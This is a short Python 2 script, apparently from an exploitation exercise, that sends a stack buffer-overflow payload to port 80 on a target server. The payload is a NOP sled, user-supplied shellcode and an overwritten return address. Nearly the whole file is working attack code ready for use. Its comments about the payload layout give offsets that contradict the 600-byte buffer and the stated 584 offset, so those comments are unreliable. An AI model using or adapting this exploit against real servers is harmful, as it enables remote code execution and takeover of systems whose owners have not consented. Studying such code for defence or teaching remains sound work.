import socket
import string
import sys
from ctypes import memset
from itertools import repeat

def run_exploit():
    if len(sys.argv) < 5:
        print "Usage: " + sys.argv[0] + " [IP] [shell code] [buffer offset] [return address]"
        sys.exit()

    ip_address = sys.argv[1]
    shell_code = sys.argv[2]
    buffer_offset = int(sys.argv[3])
    return_address = sys.argv[4]
 
    # build our payload, which is shaped as follows (using 584 offset and 
    # 0x00007fffffffe408 return address):
    # 0x0000: \x90\x90\x90\x90\x90\x90\x90\x90
    # ...      ... ... ... ... ... ... ... ...
    # 0x012c: SHELLCODE (132 bytes)
    # 0x01b0: \x90\x90\x90\x90\x90\x90\x90\x90
    # ...      ... ... ... ... ... ... ... ...
    # 0x03f8: \x08\xe4\xff\xff\xff\x7f\x00\x00
    # 0x4000: \x0d\x0a\x00\x00\x00\x00\x00\x00

    payload = bytearray(600)
    payload[0:buffer_offset] = repeat("\x90", int(sys.argv[3]))
    payload[300:300+len(shell_code)] = shell_code
    payload[buffer_offset:buffer_offset + 8] = bytearray.fromhex(return_address)[::-1]
    payload[buffer_offset + 8] = 0x0d
    payload[buffer_offset + 9] = 0x0a

    # create a connection to the server
    try:
        ip = socket.gethostbyname(ip_address)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, 80))
        sock.send(payload)
        sock.close()
    except socket.error as err:
        print err
        sys.exit()

if __name__ == "__main__":
    run_exploit()
